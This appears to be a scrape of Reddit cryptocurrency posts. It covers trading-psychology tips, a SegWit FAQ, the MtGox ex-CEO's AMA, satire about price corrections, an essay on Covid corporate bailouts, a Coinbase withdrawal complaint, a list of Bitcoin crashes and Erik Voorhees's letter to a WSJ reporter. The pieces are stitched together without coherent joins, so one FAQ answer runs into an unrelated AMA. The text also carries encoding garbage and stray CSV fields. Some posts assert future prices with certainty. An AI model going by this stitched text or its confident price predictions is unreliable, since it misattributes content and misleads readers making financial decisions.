4. **Beware of historical analogies and 'I knew it all along' thing**. As humans, we are prone to hindsight bias, a tendency, after an event has occurred, to see it as having been easily predictable. We are all blinded by hindsight bias because our brain looks for simplistic linear link between cause and effect. This way when an unexpected event happens, the brain uses the knew-it-all-along mode to cope with cognitive dissonance and make sense of the surrounding world. While trading hindsight bias harms you in two ways: a) it drains you psychologically for not making 'the right' decisions in the past, and by luring you into oversimplified historic analogies, b) it creates a false sense of investment security at the present time. Just look at everyone complaining they've sold their BTC at the worst possible time (as a matter of fact, I am no different ‚Äì I still autodestructively loathe my decision to liquidate a large portion of my BTC portfolio after the BTC price hiked to 8k). It is also very tempting to think you wouldn't miss 'the next bitcoin'. The problem is, though, that it is incredibly difficult if at all possible to spot such an opportunity. You have to be either lucky or extremely well informed (and lucky) to capitalize early on such opportunity. In reality, it's very difficult to differentiate between useless information (noise) and something that truly matters (signal). Which brings me yet to another point...

5. **Stop being a news junkie and start filtering what you read/hear/see**. If you don't, at some point in time the quantity of consumed news will start to impact your decisions and it will begin to negatively correlate with the net gain of your investment portfolio. Instead of reading news nonstop, better educate yourself ‚Äì dive deep into the market fundamentals and the technology you're dealing with. This way it will be easier for you to spot new lucrative investment opportunities when the time comes.

6. **Accept the fact that idiots also happen to make lots of money and move on**. Multiple times too, if they're lucky ones. However, the net worth of (lucky) idiot doesn't mean you should imitate him and become one. Some two months ago a Dutch father of two young children sold his family's house, bought BTC and other cryptocurrencies, and relocated his family to a rented property. After the recent spike in BTC price the guy's net worth must have increased substantially. So, is he an idiot? Absolutely! It is only a question of time before he ruins his own and his family's life with some incredibly reckless financial decision.

7. **Try to understand the motives governing your decisions and act (or don't act) accordingly**. If your actions are about to be driven by extreme emotions such as fear, panic or excitement ‚Äì stop immediately and reevaluate the situation. Otherwise you'll end up belonging to the FOMO buyer/panic seller club aka the money losers. If you want to stay on the earning side long term, you must keep your head cool and think clearly.

8. **Day trading is probably not for you**. Consider this: evidence in neuroscience research shows that we are a loss-averse species. For this we should thank our stone age ancestors who had barely enough food, shelter and belongings to survive in a very adverse world. Losing even a little of what they had meant their existence was in jeopardy. This explains why contemporary humans prefer avoiding financial loss to making financial gain. Neuroscientists claim that losing money activates the same area of the brain that responds to mortal danger. This is why in order to do day trading you must have A LOT of self-control and balls of steel ‚Äì there are many ups and downs during a single day. It drains you emotionally, you end up being addicted to adrenaline, your fianc√©e hates it, and the hodlers will probably outperform you in the long run anyway.

9. **Volatility is your friend**. Over time BTC volatility makes the coin stronger, not weaker. While wild swings in price makes BTC almost impossible to use as a currency, volatility is good from the financial asset point of view. Traders and investors dealing with BTC get used to huge and sudden price hikes and dips. Unlike for any 'stable' stock of any prominent multinational corporation, even substantial and unexpected shocks will not undermine the confidence in BTC. BTW, best of luck to everyone planning to short BTC. :)

10. **Make small mistakes, learn from them, get wiser, err less**. In your childhood days, you needed the experience of burning your hand with fire so that for the rest of your life you wouldn't need to think about the painful experience. That information is now hardwired in your brain and helps you to avoid getting harmed. If you've just started trading crypto, expect to make mistakes and prepare to learn from them. It's only after you get into FOMO, get panicked big time, take too big a risk, get out too early only to jump in at the worst possible time, ONLY and ONLY then you'll start to improve. 

**The Road to Wisdom**

The road to wisdom? ‚ÄîWell, it's plain and simple to express: Err and err and err again, but less and less and less. ‚Äî Piet Hein

**FAQs**

If I'm a HODLer, will it help to send my BTC to a Segwit address now?

- No, just get ready now so that your NEXT transaction will be to a Segwit wallet. 

Can you please tell me how to move my bitcoins to segwit address in Bitcoin core wallet? Does the sender or receiver matter? 

- The Bitcoin core wallet does not yet have a GUI for its Segwit functionality. Download Electrum v3.0.3 to generate a Segwit address.

 via [HowToToken.com](https://howtotoken.com/explained/send-bitcoin-faster-cheaper-segwit-transactions/):

 A transaction between two SegWit addresses is a SegWit transaction. 

 A transaction sent from a SegWit address to a non-SegWit address is a SegWit transaction.

 A transaction sent from a non-SegWit address to a SegWit address is NOT a SegWit transaction. You can send a Segwit Tx if the sending address is a Segwit address.

Is there a hardware wallet that does segwit addresses?

- Yes, Trezor supports Segwit by default. Ledger Nano also has support.

What wallet are you using to ""batch your sends""? And how can I do that?

- Using Electrum, the ""Tools"" menu option: ""Pay to many"".

 Just enter your receive addresses and the amounts for each, and you can send multiple transactions for nearly the price of one.

When I look at reddit, twitter, forums, or the news, the only thing people are talking about now is the market, and how much the prices are going up.  Did everyone forget what the original plan was?  

Sure the markets are great for media exposure, but wow did things change in the past few years.  Money has converted this movement into a war.  Greed has taken over.  People are more concerned about their coin ""going to the moon"" than helping others.

Subhan Nadeem has pointed out that:

[If every transaction in the Bitcoin network was a SegWit transaction today, blocks would contain up to 8,000 transactions, and the 138,000 unconfirmed transaction backlog would disappear instantly. Transaction fees would be almost non-existent once again](https://hackernoon.com/bitcoin-owners-you-need-to-do-these-two-things-right-now-a73122dd23d4). 

A few thousand bitcoin users from /r/Bitcoin switching to making their next transactions SegWit transactions will help take pressure off the network now, and together we can encourage exchanges/wallets to rapidly deploy SegWit for everyone ASAP. Let's make it happen. You can help by taking one or more of the action steps below. 
___________________

**ACTION STEPS**

1. If your favorite wallet has not yet implemented SegWit, kindly ask them to do so immediately. In the meantime start using a wallet that has already implemented SegWit. 
2. If your favorite exchange has not yet implemented SegWit, try to avoid making any further purchases of bitcoin at that exchange and politely inform them that if they do not enable SegWit within 30-days they will lose your business. Sign-up for an account at a SegWit deployed exchange now and initiate the verification process so you'll be ready to bail
3. Help educate newcomers to bitcoin about the transaction issue, steer them towards SegWit wallets from day one, and encourage them to avoid ever  purchasing bitcoin through non-SegWit ready exchanges that are harming bitcoin

**IMPORTANT NOTE**: The mempool is currently overflowing. If you are a long-term holder and really have no reason to move your bitcoins at this time, wait until the mempool starts to clear and transaction fees go down before moving your bitcoins to a SegWit address or SegWit friendly exchange

__________________________

**SELECTED TOP EXCHANGES BY SEGWIT & BATCHING STATUS**
 
There are 2 different Segwit address formats.  

* p2sh - starting with a ""3...""
* bech32 - starting ""bc1...""

Not many wallets/exchanges support bech32 yet and will claim the address is invalid if you try to send to it. bech32 (""native Segwit"") is a mildly better solution compared to p2sh.

Why doesn't the Core Wallet yet support SegWit?
 
 - The Core Wallet supports SegWit, but its GUI doesn't. The next update will likely have GUI support built-in
 
Why isn't a large exchange like Coinbase SegWit ready & deployed when much smaller exchanges already are? Why do they default to high fees? Where is the leadership there?

- Draw your own conclusions based on their own words:

0,bitcoin,"I'm Mark Karpel√®s, ex-CEO of bankrupt MtGox. Ask me anything. Dear community,

Many of you know or remember me, especially recently since the MtGox bankruptcy has been allegedly linked with Bitcoin price drops in December 2017 to February 2018. Since taking over the most active Bitcoin exchange in 2011, I ran MtGox until filing for civil rehabilitation on February 28th 2014 (which became bankruptcy less than 2 months later) because a large amount of Bitcoins went missing. Since then, four years have passed, and MtGox is still in bankruptcy today. I‚Äôve been arrested, released under bail after a little less than one year, and am now trying to assist MtGox getting into civil rehabilitation.

I did my best trying to grow the ecosystem by running the biggest exchange at the time. It had big problems but still managed to hang in there. For a while. A quite long while, even, while the rest of the ecosystem caught up. At the end of the day, the methods I chose to try to get MtGox out of its trouble ended up being insufficient, insufficiently executed, or plain wrong.

I know I didn't handle the last, stressful days of the outdrawn and painful Gox collapse very well. I can only be humble about that in hindsight. Once again, I‚Äôm sorry.

Japanese bankruptcy law has a particularly nasty outcome here, and I want to address this up front. As creditors claims were registered, those claims were registered in the valuation of Japanese Yen on the bankruptcy date. That's the only way Japanese bankruptcy law can work (most bankruptcy laws around the world operate this way for that matter). This means that the claims can be paid back in full, and there will still be over 160,000 bitcoin and bitcoin cash in assets in the Gox estate. The way bankruptcy law works is that if there are any assets remaining after the creditors have been paid in full, then those assets are distributed to shareholders as part of the liquidation.

That's the only way any bankruptcy law can reasonably work. And yet, in this case, it produces an egregiously distasteful outcome in that the shareholders of MtGox would walk away with the value of over 160,000 bitcoin as a result of what happened.

I don't want this. I don't want this billion dollars. From day one I never expected to receive anything from this bankruptcy. The fact that today this is a possibility is an aberration and I believe it is my responsibility to make sure it doesn‚Äôt happen. One of the ways to do this would be civil rehabilitation, and as it seems most creditors agree with this, I am doing my best to help make it happen. I do not want to become instantly rich. I do not ask for forgiveness. I just want to see this end as soon as possible with everyone receiving their share of what they had on MtGox so everyone, myself included, can get some closure.

I‚Äôm an engineer at heart. I want to build things. I like seeing what I build being useful, and people being happy using what I build. My drive, from day one, has been to push the limits of what is technically possible, and this is the main reason I liked and have been involved with Bitcoin in the first place. When I took over MtGox, I never imagined things would end this way and I am forever sorry for everything that‚Äôs taken place and all the effect it had on everyone involved.

Hopefully, I can make what I‚Äôve learned in this experience useful to the community as a whole, so there can at least be something positive in the end.

Ask me anything you like.

**EDIT**: With this coming to r/all there have been an overwhelming number of messages, questions etc. I will continue responding for a little while but probably won't be able to respond to new questions (it is starting to be late here and I've been spending the last few hours typing). Thank you very much to everyone."
0,bitcoin,"New to Bitcoin? Here's how to spot a correction.. So you think that 5% dip counts as a correction?

Let me give you a helpful hint..

We're not in a correction until the sweat falling down your neck meets the sweat of your ass crack in a pool on your desk chair while your sitting up at 3am staring at a stamp chart 3 inches from your face trying to convince yourself thats its going to reverse any second now. Your hand shaking like a Parkinson's patient over an oily mouse when suddenly you feel the dire need to take a shit but you vomit in your mouth a little bit instead and before you have time to question how those two bodily functions could possibly be related we've already dropped another 20%.  You've now got a big red dildo candle showing a 60% loss in a matter of minutes staring back at you as price has dipped far below your buy in spot, all the profits you made over the past several weeks, dreams of that new car, that new house disappear in an instant and you cant imagine what possibly could have caused this. 

You default to erroneously blaming the Chinese but that doesn't quite add up so you take to twitter with panicked breath searching for anyone, anything that might have the answer as to what the F is happening.  Of course no one has any more of a clue then you do so you immediately start to internalize the struggle.  What starts as a whisper of ""why didn't I just sell"" turns into a rampage scream in the back of your mind, after all its so obvious that this was the top, it's so clear now looking back, of course that was the top how the hell didn't I see that 15 minutes ago?  Meanwhile we're down another 5% and you just can't take it anymore.  Tears are rushing from your eyes, something that looks like dried blood is all over your arm emanating from the spot you didn't realize you were subconsciously digging your fingernail into.  You close your eyes just for a moment but when they reopen you realize you've somehow already logged into your Coinbase account and punched in a sell order.  Thats it.  You sold.  Your devastated, but manage to breathe a small sigh of relief. Well at least i can't lose anymore you say, at least i walked away with something.  Your emotionally and physically exhausted now but you manage to drag yourself across the room, you fall flat on your bed with one final thought passing through your mind before you let the darkness overtake you...""why didn't i just sell the top?""

In the morning you wake to the realization that you slept fully clothed and at an odd enough angle that your neck is surely going to feel exactly as bad if not worse for the rest of the day.  The events of the previous night come back to you in a flurry of blurred emotions and while you almost can't bring yourself to check the price you just have to know.  How much lower did it go? After all, there is still a glimmer of a hope, you think well, perhaps it isn't all bad, perhaps I can buy back in a bit lower and make the losses back in the long term.  You begrudgingly open a chart and whatever small amount of hope that remained escapes your lungs before the sigh hits your lips.  Price has fully recovered, it's actually trading up 10% from yesterdays highs...

Thats a correction.

Edit:  For those who didn't get the joke this is just some bitcoin satire not my life story.  It's the result of reading too much r/bitcoin and r/nosleep at the same time...

Everyone should invest based on their own risk tolerances and in accordance with their own investment goals.  Hodling is a viable strategy for those who truly believe Bitcoin is the next big thing, but a word of caution to the new comers who are just here for a quick buck.  This space can and will be more volatile then anything you've ever seen before."

0,bitcoin,"The Covid corporate bonus bailout costs about $18,000 per citizen. So Congress is taking $18,000 from your future, giving $16,800 to corporations and giving you back a check for $1,200. >#Chancellor on brink of second bailout for banks. 2009 



The coronavirus shutdown is hammering supply and demand across the globe. That has forced the real economy into a sharp recession and triggered a rolling financial crisis. Below is a primer on one key piece of this mess: the crisis in corporate debt markets. This branch of finance is vitally important because even healthy companies often need access to credit. If they do not get it, they go under.

In 2008, the vector of crisis ran from mortgage-backed securities to the rest of the financial sector and then to the real economy. This time, the real economy is being hit directly, and the damage is reverberating back into financial markets.  The failing markets, in feedback-loop fashion, further threaten the real economy as corporations find it harder to borrow. As the corporate debt markets sour, major companies will go bankrupt. Unemployment is skyrocketing. Some analysts expect the economy to contract by an annualized rate of 30 percent during the second quarter of 2020.

Already, US financial markets are on public life support. The Federal Reserve has committed to unlimited purchases of all sorts of assets: US Treasuries, mortgage-backed securities, car loans, municipal debts, and, in a historic step, both short term and long-term corporate debt. But the crisis will require more than a financial rescue.

The key political question now is: What sort of controls will come with the state intervention? Corporate greed and self-dealing need to be checked not merely in the name of fairness but also to make sure public bailout money is actually invested in the real economy rather than just gambled away, as it was after the 2008 crash and rescue.

###The Rise of Corporate Debt

Since 2008, household debt levels have actually declined and are now lower than they were going into the last crash. But not corporate debt. Measured as a firm‚Äôs ‚Äúnet debt‚Äù compared to its EBITDA (earnings before interest, tax, depreciation, and amortization), corporate debt has doubled since the last crash. In 2009, the average American company owed $2 of debt for every $1 in earnings. Today, the average firm carries net debt to EBITDA of 3 to 1, and many firms ‚Äî like Ford Motor, CarMax, Harley-Davidson, and General Motors ‚Äî carry ratios ranging from 8 to 1, to as high as 15 to 1. Boeing, a special case because of its 737 MAX crisis, carries a ratio of 37 to 1.

Over the last two decades, corporate America‚Äôs credit rating has collapsed. In the early ‚Äô90s, more than sixty companies held AAA credit ratings. Today, only two US firms are AAA rated: Johnson & Johnson and Microsoft. In 2001, fewer than one in five ‚Äúinvestment-grade‚Äù firms were rated BBB. Today half of all investment-grade corporate debt belongs to firms rated ‚Äútriple-B‚Äù (BBB) or lower. A third of those firms are rated triple-B minus (BBB-), one notch away from speculative or ‚Äújunk‚Äù status.

Already many triple-B-rated corporate bonds are trading on secondary markets at unusually low prices and high yields, often above 5 percent; that means even ‚Äúinvestment grade‚Äù bonds are being treated as junk. Soon many triple-B-rated corporations will be formally downgraded to junk. That will drive up their borrowing costs and restrict their access to credit. Even healthy companies often need access to ready credit. If they do not get it, they go under.

The rating agency Moody‚Äôs estimates the default rate for ‚Äúspeculative-grade‚Äù debt ‚Äî companies with ratings lower than Baa from Moody‚Äôs Investors Service, or a rating lower than BBB from Standard & Poor‚Äôs ‚Äî might reach 10 percent this year, up from 2.3 percent last year. The consequences of all this will reverberate throughout the wider economy, deepening and extending the recession.

Total global corporate debt, including bonds and loans, is approximately $66 trillion; more than double what it was a decade ago. For comparison, the combined gross national product of all economies was estimated at $80.27 trillion in 2017. About a quarter of that is the US economy.

###What They Did With the Money

After the 2008 crash, the world‚Äôs central banks, with the US Federal Reserve in the lead, spent the next decade pushing money into the financial markets by way of super-low interest rates and the direct public purchase of financial assets from the private sector via quantitative easing (QE).

The cheap credit encouraged lots of corporate borrowing in the form of loans from banks and massive issuance of corporate bonds. Unlike loans, which can be routinely extended, or sometimes abruptly terminated, or have interest rates that float up and down, corporate bonds are debt instruments issued by a company committing to repay borrowed money on a specified schedule at a specified, usually fixed, rate of interest.

Corporations have been borrowing for a variety of reasons that range from shrewd arbitrage to stupid and reckless asset stripping. For a struggling and unprofitable company, for example JCPenney, debt can be a lifeline. For a profitable firm, borrowing money can be a way to raise capital without diluting existing shareholders‚Äô claim on the company‚Äôs profits, which would happen if the firm issued stock.

Even some profitable firms with piles of cash borrowed rather than spend their cash, in part for the firepower effect: letting other competitors and market entrants know that the firm has enough money on hand to buy out any threatening start-ups, and showing the world the firm is ready to ride out any economic crisis.

Some firms used their borrowed money to buy other firms. This helped fuel a post-2008 wave of mergers and acquisitions (M&As). Deloitte reported ‚Äúmore than $10 trillion in [M&A] domestic transactions since 2013.‚Äù Targeted companies borrowed to stockpile cash as a defense against such takeovers.

Firms also borrowed to fund CEO compensation, distributions to investors via dividends, and stock buybacks. Companies buy back their own stock so as to boost its price. A rising stock price is useful in many ways: it can keep away hostile raiders by making a targeted company too expensive to take over, but it can also draw in friendly suitors because (with some creative accounting) a rising stock value can make a weak firm appear more profitable. Corporate executives like a rising stock price because compensation packages are both tied to stock performance and almost always include some payment in company stock, so the higher the stock price, the higher the executives‚Äô payout.

Sometimes, firms even invested their borrowed money in actual production. The capital-intensive oil and gas industry did that, but as we explain below, it still faces a crisis, perhaps more salient than other sectors.

###Bad Credit as Perverse Incentive

The end result of all the borrowing was declining corporate credit-worthiness: corporate debt soon badly outpaced their earnings growth and cash balances. This led to widespread credit-rating downgrades.

Perversely, lower credit ratings did not slow the borrowing binge, but rather spurred on further lending and borrowing, because as corporate credit ratings slipped, the interest rate that the downgraded firms had to pay on their loans and bonds increased. And, thus, so too did the lenders‚Äô profits.

Corporate debt and stock prices entered into a twisted dialectic, each driving the other. As the stock market continued to inflate over the last decade, it provided the confidence investors required to continue their purchases of risky corporate bonds.

Keep in mind that many of the lending banks and asset funds were actually or essentially borrowing from Uncle Sam at inflation-adjusted rates close to zero, then lending to companies with triple-B and triple-B minus ratings at 5 percent interest. Profits like that meant there were always banks and asset funds eager to lend to debt-burdened corporations.

Investors could directly purchase specific corporations‚Äô bonds, or, as is more often the case, invest in mutual funds or exchange-traded funds (ETFs) that target an array of corporate bonds. High-risk loans were also sliced and diced and repackaged into bundles called ‚Äúcollateralized loan obligations‚Äù (CLOs), a class of securities backed by an underlying portfolio of corporate loans.

According to the Federal Reserve Board of Governors, the majority of American CLOs are held by US institutional investors, including insurance companies, mutual funds, and depository institutions. This means that when the debt is unable to be serviced, the pain will be absorbed within the US economy, much of it by the unassuming customers of these financial behemoths.

As was the case with the mortgage-backed securities of the 2008 crash, these funds helped ‚Äúdistribute risk‚Äù and thus gave an appearance of safety. The logic was that owning 1 percent of a hundred different loans would be safer, even if some loans went bad, than owning the entirety of a single debt security. The logic is not entirely wrong. And that is part of the problem: it encouraged yet more lending. As long as the economic forecast was optimistic, there was no reason for the debt spree to let up.

###Zombies and Others

Corporate debt, like much of the economy, is a story of disparities. Not every corporation is burdened by debt. Some firms are actually awash in cash. Microsoft, Berkshire Hathaway, Alphabet Inc, and Apple each sit on more than $100 billion in cash. As a whole, corporate America has been sitting on record amounts of cash in recent years. But at the same time, Morgan Stanley Investment Management estimates that one in six US companies cannot cover even the interest payments on their debts.

At the heart of the problem are ‚Äúleveraged loans‚Äù and so-called zombie firms. Leveraged loans are a type of expensive, high-risk credit extended to already heavily indebted companies. Since the 2008 crash, the leveraged loan market has doubled to $1.2 trillion. Now, leveraged loans in the United States are being re-sold at only 84 cents on the dollar, their lowest price since August 2009. The majority of leveraged loans ‚Äî more than half ‚Äî are in the form of the aforementioned CLOs. In the fourth quarter of 2018, there were $617 billion of CLOs outstanding.

Zombie firms are defined by the Bank for International Settlements as heavily indebted, well-established companies that have failed to be profitable over an extended period and have low expected profitability in the future. In other words, heavily indebted start-ups do not qualify as zombies. The most threatened sectors are energy, automotive, insurance, capital goods (meaning equipment and machinery), telecoms, aerospace and defense, and some parts of retail.

The bull market of rising, often overvalued, stock prices allowed many uncompetitive and unprofitable companies to appear healthy based solely on their stock‚Äôs performance. Even before the markets started to crash on March 9, some analysts were prescient enough to call the market‚Äôs bluff at the beginning of the year.

But in this rapidly developing crisis, firms all across the economy may soon find it impossible to meet their liabilities. With the coronavirus breaking supply chains and forcing massive constrictions in consumer demand, corporate earnings are contracting fast, which in turn will badly hurt corporate debt servicing.

Like a hypertrophied organ rupturing, the putrefaction of unsustainable corporate debt now threatens to create a generalized economic sepsis that will hurt even healthy firms.

###Profiles in Debt

Airlines. The top six major US airlines spent enormous sums to buy back their stock over the last decade. US airlines (as a whole) spent 96 percent of their borrowed money on buying back stock. Now, revenue from flights is plummeting. United Airlines‚Äô bookings have fallen by 70 percent. Back in 2011, American Airlines filed for Chapter 11 bankruptcy with $29 billion in liabilities; today, they have over $34 billion in debt. Yields on some of their bonds reached a whopping 12 percent, a particularly distressing sign as interest rates have been slashed by the Fed in an effort to relieve credit markets.

Energy. Even before the effects of coronavirus eviscerated demand for fossil fuels, US energy companies were suffering due to high fixed costs and low energy prices. In the last five years, 208 US energy companies have declared bankruptcy. Energy prices have been pushed down by the fracking revolution, the rise of renewable energy, and oil overproduction due to struggles between large producers like Saudi Arabia, Russia, and the United States.

Now the coronavirus shock is pushing firms over the edge. Occidental Petroleum ‚Äî which has $40 billion in debt, while its market value (the value of all of its stocks combined) is less than $11 billion ‚Äî recently had its debt downgraded to junk.

Energy mutual funds reveal the crisis in the energy sector as a whole. Vanguard Energy Fund, considered one of the top four oil mutual funds, has lost over 41 percent of its value since the beginning of the year. Of course, the biggest oil companies, the ‚ÄúOil Majors‚Äù (such as BP, Exxon Mobil, and Royal Dutch Shell) have enough resources, market power, and government support to survive the crisis. But the effects on the less established firms stretch beyond the energy industry itself.

Lenders. As the oil and gas firms go into crisis, the banks that extended them credit may also face defaults. Loans outstanding to the petroleum sector from regional banks in North America exceed $100 billion. Banks financing oil companies in Texas and Oklahoma saw their share prices drop nearly 30 percent. In oil-dependent states, public budgets will hurt as tax revenues decline sharply.

Retail. A number of important retailers carry net debt to EBITDA ratios that are too high to be sustainable under current conditions. For example, Rite Aid owes $15.80 for every dollar it earns. For JCPenney, the ratio is $8.30 to $1; for Walgreens Boots Alliance, it is $5.80 to $1. Office Depot owes $4.60 compared to every dollar earned.

###Beyond Bailout

Bailing out distressed companies, even taking them under public ownership for a while, may staunch the bleeding. And the bubble can eventually be reinflated with enough effort. But a replay of the 2008 bailout, which involved lots of public money but very little public regulation and planning, will only mean a long slump followed by a bubble for the rich.

The American economy is a sick beast. It needs not only government handouts and ownership ‚Äî which it is getting ‚Äî it also needs planning.

Oil, airlines, and cruise ships ‚Äî these are high-emission industries that, in the face of climate crisis, must be radically transformed or cease to exist. With government ownership and planning, these industries could be unwound and their resources redeployed.

Although COVID-19 set off our current recession, it was the indulgence of the 1 percent built into the 2008 rescue that is responsible for the depth and severity of our current economic crisis. Without guidance, money was poured into the financial system. Not surprisingly, it blossomed alongside the mutually reinforcing dynamic of artificially inflated stock prices and ballooning corporate debt.

Capitulation to the gluttony of financiers is deeply unjust. But it is also unworkable in purely technical terms. Without constraints on greed, there will be another bubble and crash and a longer slump, more suffering, greater inequality, and more social instability. We have to force government to use its legal and financial power to steer the American economy toward more egalitarian, socially rational, and environmentally sustainable purposes. We have to make this bailout work for the majority of us.

#Corporate Socialism: The Government is Bailing Out Investors & Managers Not You


The U.S. government is enacting measures to save the airlines, Boeing, and similarly affected corporations. While we clearly insist that these companies must be saved, there may be ethical, economic, and structural problems associated with the details of the execution. As a matter of fact, if you study the history of bailouts, there will be.



The bailouts of 2008‚Äì9 saved the banks (but mostly the bankers), thanks to the execution by then-treasury secretary Timothy Geithner who fought for bank executives against both Congress and some other members of the Obama administration. Bankers who lost more money than ever earned in the history of banking, received the largest bonus pool in the history of banking less than two years later, in 2010. And, suspiciously, only a few years later, Geithner received a highly paid position in the finance industry.

That was a blatant case of corporate socialism and a reward to an industry whose managers are stopped out by the taxpayer. The asymmetry (moral hazard) and what we call optionality for the bankers can be expressed as follows: heads and the bankers win, tails and the taxpayer loses. Furthermore, this does not count the policy of quantitative easing that went to inflate asset values and increased inequality by benefiting the super rich. Remember that bailouts come with printed money, which effectively deflate the wages of the middle class in relation to asset values such as 
ultra-luxury apartments in New York City.

The Generalized Bob Rubin Trade: Keep the profits, transfer losses to taxpayers. Named after Bob Rubin who pocketed 120 million dollars from Citi but claimed uncertainty and kept past bonuses. This encourages anyone to never be insured for such eventualities since the government will pick up the tab.

####If It‚Äôs Bailed Out, It‚Äôs a Utility

First, we must not conflate airlines as a physical company with the financial structure involved. Nor should we conflate the fate of the employees of the airlines with the unemployment of our fellow citizens, which can be directly compensated rather than indirectly via leftovers of corporate subsidies. We should learn from the Geithner episode that bailing out individuals based on their needs is not the same as bailing out corporations based on our need for them.

Saving an airline, therefore, should not equate to subsidizing their shareholders and highly compensated managers and promote additional moral hazard in society. For the very fact that we are saving airlines indicates their role as utility. And if as such they are necessary for society, then why do their managers have optionality? Are civil servants on a bonus scheme? The same argument must also be made, by extension, against indirectly bailing out the pools of capital, like hedge funds and endless investment strategies, that are so exposed to these assets; they have no honest risk mitigation strategy, other than a trained na√Øve reliance on bailouts or what‚Äôs called in the industry the ‚Äúgovernment put‚Äù.

Second, these corporations are lobbying for bailouts, which they will eventually get thanks to the pressure they can exert on the government via lobby units. But how about the small corner restaurant ? The independent tour guide ? The personal trainer? The massage professional? The barber? The hotdog vendor living from tourists near the Met Museum ? These groups cannot afford lobbyists and will be ignored.

####Buffers Not Debt

Third, as we have been warning since 2006, companies need buffers to face uncertainty ‚Äìnot debt (an inverse buffer), but buffers. Mother nature gave us two kidneys when we only need about a portion of a single one. Why? Because of contingency. We do not need to predict specific adverse events to know that a buffer is a must. Which brings us to the buyback problem. Why should we spend taxpayer money to bailout companies who spent their cash (and often even borrowed to generate that cash) to buy their own stock (so the CEO gets optionality), instead of building a rainy day buffer? Such bailouts punish those who acted conservatively and harms them in the long run, favoring the fool and the rent-seeker.

####Not a Black Swan

Furthermore, some people claim that the pandemic is a ‚ÄúBlack Swan‚Äù, hence something unexpected so not planning for it is excusable. The book they commonly cite is The Black Swan. Had they read that book, they would have known that such a global pandemic is explicitly presented there as a white swan: something that would eventually take place with great certainty. Such acute pandemic is unavoidable, the result of the structure of the modern world; and its economic consequences would be compounded because of the increased connectivity and overoptimization. As a matter of fact, the government of Singapore, whom we advised in the past, was prepared for such an eventuality with a precise plan since as early as 2010.

Withdrew $2809.49 on 3/22 7:29pm to Capital One 360 account, get an email saying 1-2 days, 2 days later money is in my account.

Am I mad to be anxious about this? I'd like to think that someone would respond from Coinbase to help me out on this. It's not a small sum for me either so I'd like to get it as soon as possible.

I've contacted support, I left a message in the community and twitter but all I here is the deafening silence.



**UPDATE**: **Just got this e-mail as there was a problem on their side which is what I thought, email below**

**Sorry for the trouble with this, there was a problem with the withdrawal as you noticed. I was able to cancel it, and the funds are now back in your USD wallet. You can withdraw whenever you like.**

**Thanks, and please let me know if you have any further questions.**

0,bitcoin,"Lesson - History of Bitcoin crashes Bitcoin has spectacularly 'died' several times

üìâ - 94% June-November 2011 from $32 to $2 because of MtGox hack

üìâ - 36% June 2012 from $7 to $4 Linod hack

üìâ - 79% April 2013 from $266 to $54. MTGox stopped trading

üìâ - 87% from $1166 to $170 November 2013 to January 2015

üìâ - 49% Feb 2014 MTGox tanks

üìâ - 40% September 2017 from $5000 to $2972 China ban

üìâ - 55% January 2018 Bitcoin ban FUD. from $19000 to 8500

I've held through all the crashes. Who's laughing now? Not the panic sellers.

Market is all about moving money from impatient to the patient. You see crash, I see opportunity.

You - OMG Bitcoin is crashing, I gotta sell!

Me - OMG Bitcoin is criminally undervalued, I gotta buy!

N.B. Word to the wise for new investors. What I've learned over 7 years is that whenever it crashes spectacularly, the bounce is twice as impactful and record-setting. I can't predict the bottom but I can assure you that it WILL hit 19k and go further beyond, as hard as it may be for a lot of folks to believe right at this moment if you haven't been through it before.

When Bitcoin was at ATH little over a month ago, people were saying, 'it's too pricey now, I can't buy'.

Well, here's your chance at almost 60% discount!

With growing main net adoption of LN, Bitcoin underlying value is greater than it was when it was valued 19k."

0,bitcoin,"Open Letter to Michael Casey - WSJ reporter who butchered my comments in today's Bitcoin cover story Hello Mr. Casey,

I read your WSJ article today. I feel deceived by you.

You requested to speak with me, so I took time out of my day to do so. We talked for 20 minutes, during which time I conveyed to you my sentiments about the Bitcoin ecosystem and the matter of MtGox's collapse. My message was unambiguously a positive one. I didn't focus whatsoever on the personal funds I lost at Gox. Indeed, the impetus for your call was my heartfelt post on Reddit. 

Yet, you ignored everything I said. The only quote that you published from me in the Journal's cover story was """"That's gone now,"" said Mr. Veerhoos, who is based in Panama City, Panama. ""There's no chance of getting that back now."""" 

Is that really the takeaway you had from our call and from my letter? Is that your idea of journalism? Did I come across with the sentiment of a despairing investor whose confidence has been rattled? It seems you were happy to completely ignore my sentiments, preferring instead to cherry pick the one fact that is least important, in order to paint a narrative that Bitcoin's biggest problem is that it's not ""regulated.""  I didn't expect you to quote everything I said, but should you not have maintained at least a modicum of fidelity to my message?

I have dedicated my life to building and supporting the Bitcoin project. I don't give a damn about the money I lost at Gox. That's not important. What is important is that Bitcoin is resilient and enduring, and will continue to grow and change the world for the better. It is a story of human progress through technology. It is a story of the good seeping into the cracks of a corrupted financial system. It is a story of passionate people struggling against all odds to remedy the calamities brought down upon society from the most potently misguided people and institutions on Earth. 

Next time you spend your efforts casting a pall over this cause, please don't ask me to contribute mine. 

 -Erik Voorhees

PS - I will be posting this letter openly on Reddit. I will post your reply if you'd like. And if I do, I won't cherry pick the most misleading points of it, and I will spell your name correctly.

 I am invested in bitcoin and have been a supporter since 2012, so hitting 10k was a mixed bag.

I've made more than I've lost with BTC but the point was never about making money off an investment like a stock, it was about buying bitcoin so I could spend it.

The exchanges here in my country, they base the Bitcoin price in US$ dollar, they just convert it to R$ Real. At that time, 1 BTC = R$ 29.350, now days 1 BTC = R$ 55.500. This means that my original R$ 1.000 is now almost at R$ 1.900! That‚Äôs because Brazil is in a really bad political and economic situation and the price of dollar is all times high, making R$ Real devalued.

That‚Äôs when it hit me. Now I understand why people on nations that is f\*cking their money up buys BTC, it saves it from inflation! Recently the Halving happen and it hit me again, Bitcoin is a deflationary money! Every day it becomes a scarce resource, but the demand is the same, making the price go up! **Bitcoin is not the future, it‚Äôs the present!

